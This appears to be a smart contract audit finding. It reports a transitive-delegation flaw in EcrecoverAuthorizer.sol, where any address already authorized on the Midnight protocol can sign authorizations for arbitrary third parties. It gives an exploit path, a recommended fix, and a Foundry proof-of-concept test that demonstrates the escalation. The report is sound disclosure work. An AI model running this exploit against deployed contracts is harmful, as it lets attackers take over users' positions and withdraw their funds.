### Title
Authorized Agent Can Transitively Grant Arbitrary Authorizations via EcrecoverAuthorizer - (File: src/periphery/EcrecoverAuthorizer.sol)

### Summary
`EcrecoverAuthorizer.setIsAuthorized` accepts a signature from any address that is already authorized by the `authorization.authorizer` on Midnight, not just the authorizer's own key. This allows any Midnight-authorized agent of A to sign an `Authorization` struct naming an arbitrary third party and have it accepted, creating a transitive delegation chain that A never consented to.

### Finding Description
The signer check at lines 33–36 of `src/periphery/EcrecoverAuthorizer.sol` is:

```solidity
require(
    signer == authorization.authorizer || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
    Unauthorized()
);
```

The second branch permits any address that `authorization.authorizer` (A) has already authorized on Midnight to sign an `Authorization` struct on A's behalf.

**Exact exploit path:**

Preconditions (both are normal user actions):
1. A calls `Midnight.setIsAuthorized(ecrecoverAuthorizer, true, A)` — standard setup to use the periphery contract.
2. A calls `Midnight.setIsAuthorized(attacker, true, A)` — A grants attacker some operational role.

Attack:
3. Attacker constructs `Authorization(authorizer=A, authorized=malicious, isAuthorized=true, nonce=ecrecoverAuthorizer.nonce(A))` with a valid future deadline.
4. Attacker signs this struct with their own private key → `ecrecover(digest, ...) = attacker`.
5. Attacker calls `EcrecoverAuthorizer.setIsAuthorized(auth, attackerSig)`.

Trace through `EcrecoverAuthorizer.setIsAuthorized`:
- Deadline and nonce checks pass (attacker controls both fields).
- `signer = attacker` (recovered from attacker's own signature).
- `signer == A` → false.
- `IMidnight(MIDNIGHT).isAuthorized(A, attacker)` → **true** (precondition 2). Check passes.
- Calls `IMidnight(MIDNIGHT).setIsAuthorized(malicious, true, A)`.

Trace through `Midnight.setIsAuthorized` (lines 731–735):
- `msg.sender = EcrecoverAuthorizer`, `onBehalf = A`.
- `isAuthorized[A][EcrecoverAuthorizer]` → **true** (precondition 1). Check passes.
- `isAuthorized[A][malicious] = true`.

No existing check stops this. The `EcrecoverAuthorizer` nonce is consumed for A, but the attacker can repeat this with the next nonce to authorize additional addresses. The `Authorization` struct contains all attacker-controlled fields (`authorized`, `isAuthorized`, `nonce`, `deadline`); the only field not controlled is `authorizer=A`, but that is exactly what enables the attack. [1](#0-0) [2](#0-1) 

### Impact Explanation
Once `isAuthorized[A][malicious] = true`, the malicious address can call any `onBehalf`-gated function in Midnight on A's behalf: `withdraw`, `withdrawCollateral`, `repay`, `take` (as taker), `setConsumed` (cancelling all of A's offer groups), and `setIsAuthorized` again to further expand the authorization set. This directly enables the scoped DoS on `take`, `repay`, `withdraw`, and `liquidate` (e.g., front-running repayments, draining withdrawable credit, or cancelling all outstanding offers via `setConsumed`). [3](#0-2) 

### Likelihood Explanation
Preconditions are both routine: any user who uses `EcrecoverAuthorizer` must satisfy precondition 1, and any user who has granted an operational role (e.g., a keeper, a relayer, or a trading bot) satisfies precondition 2. The attacker needs no funds, no special role, and no oracle manipulation. The attack is a single transaction and is fully repeatable (each call consumes one nonce but the attacker can authorize multiple malicious addresses across multiple calls before A notices). [4](#0-3) 

### Recommendation
Remove the `IMidnight(MIDNIGHT).isAuthorized` branch from the signer check in `EcrecoverAuthorizer.setIsAuthorized`. The purpose of this contract is to translate an off-chain ECDSA signature from the authorizer's own key into an on-chain authorization; it should not accept signatures from Midnight-authorized delegates. The fix is:

```solidity
require(signer == authorization.authorizer, Unauthorized());
```

If delegated signing is intentionally desired, it must be scoped to a separate, explicitly opt-in mechanism that does not allow the delegate to grant further authorizations. [5](#0-4) 

### Proof of Concept

```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import {BaseTest} from "./BaseTest.sol";
import {
    Authorization, Signature, EIP712_DOMAIN_TYPEHASH, AUTHORIZATION_TYPEHASH
} from "../src/periphery/interfaces/IEcrecoverAuthorizer.sol";

contract TransitiveDelegationPoC is BaseTest {
    function testAttackerTransitiveDelegation() public {
        // Setup: victim (borrower) authorizes EcrecoverAuthorizer and attacker on Midnight
        vm.startPrank(borrower);
        midnight.setIsAuthorized(address(ecrecoverAuthorizer), true, borrower);
        midnight.setIsAuthorized(attacker, true, borrower);
        vm.stopPrank();

        address malicious = makeAddr("malicious");
        assertEq(midnight.isAuthorized(borrower, malicious), false);

        // Attacker constructs Authorization naming malicious as authorized on behalf of borrower
        Authorization memory auth = Authorization({
            authorizer: borrower,
            authorized: malicious,
            isAuthorized: true,
            nonce: ecrecoverAuthorizer.nonce(borrower), // 0
            deadline: block.timestamp + 1 days
        });

        // Attacker signs with their OWN key (not borrower's key)
        bytes32 structHash = keccak256(abi.encode(AUTHORIZATION_TYPEHASH, auth));
        bytes32 domainSep = keccak256(abi.encode(EIP712_DOMAIN_TYPEHASH, block.chainid, address(ecrecoverAuthorizer)));
        bytes32 digest = keccak256(bytes.concat("\x19\x01", domainSep, structHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(privateKey[attacker], digest);
        Signature memory sig = Signature({v: v, r: r, s: s});

        // Attacker submits — should revert but does not
        vm.prank(attacker);
        ecrecoverAuthorizer.setIsAuthorized(auth, sig);

        // Assert: malicious is now authorized on borrower's behalf without borrower's direct signature
        assertTrue(midnight.isAuthorized(borrower, malicious));
        // malicious can now withdraw borrower's funds, cancel offers, etc.
    }
}
```

Expected assertion: `assertTrue(midnight.isAuthorized(borrower, malicious))` passes, demonstrating that the attacker's own signature — not the borrower's — was sufficient to authorize an arbitrary third party on the borrower's behalf. [4](#0-3) [6](#0-5)

### Citations

**File:** src/periphery/EcrecoverAuthorizer.sol (L24-48)
```text
    function setIsAuthorized(Authorization memory authorization, Signature calldata signature) external {
        require(block.timestamp <= authorization.deadline, Expired());
        require(authorization.nonce == nonce[authorization.authorizer]++, InvalidNonce());

        bytes32 hashStruct = keccak256(abi.encode(AUTHORIZATION_TYPEHASH, authorization));
        bytes32 domainSeparator = keccak256(abi.encode(EIP712_DOMAIN_TYPEHASH, block.chainid, address(this)));
        bytes32 digest = keccak256(bytes.concat("\x19\x01", domainSeparator, hashStruct));
        address signer = ecrecover(digest, signature.v, signature.r, signature.s);
        require(signer != address(0), InvalidSignature());
        require(
            signer == authorization.authorizer || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
            Unauthorized()
        );

        emit SetIsAuthorized(
            msg.sender,
            authorization.authorizer,
            authorization.authorized,
            authorization.isAuthorized,
            authorization.nonce
        );

        IMidnight(MIDNIGHT)
            .setIsAuthorized(authorization.authorized, authorization.isAuthorized, authorization.authorizer);
    }
```

**File:** src/Midnight.sol (L723-727)
```text
    function setConsumed(bytes32 group, uint256 amount, address onBehalf) external {
        require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
        require(amount >= consumed[onBehalf][group], AlreadyConsumed());
        consumed[onBehalf][group] = amount;
        emit EventsLib.SetConsumed(msg.sender, group, amount, onBehalf);
```

**File:** src/Midnight.sol (L731-733)
```text
    function setIsAuthorized(address authorized, bool newIsAuthorized, address onBehalf) external {
        require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
        isAuthorized[onBehalf][authorized] = newIsAuthorized;
```

**File:** test/SetIsAuthorizedWithSigTest.sol (L54-72)
```text
    function testEcrecoverAuthorizer() public {
        vm.prank(borrower);
        midnight.setIsAuthorized(address(ecrecoverAuthorizer), true, borrower);
        Authorization memory auth = makeAuthorization(borrower, lender, true);
        Signature memory sig = signAuthorization(auth, borrower);

        ecrecoverAuthorizer.setIsAuthorized(auth, sig);

        assertEq(midnight.isAuthorized(borrower, lender), true);
        assertEq(ecrecoverAuthorizer.nonce(borrower), 1);

        auth = makeAuthorization(borrower, lender, false);
        sig = signAuthorization(auth, borrower);

        ecrecoverAuthorizer.setIsAuthorized(auth, sig);

        assertEq(midnight.isAuthorized(borrower, lender), false);
        assertEq(ecrecoverAuthorizer.nonce(borrower), 2);
    }
```
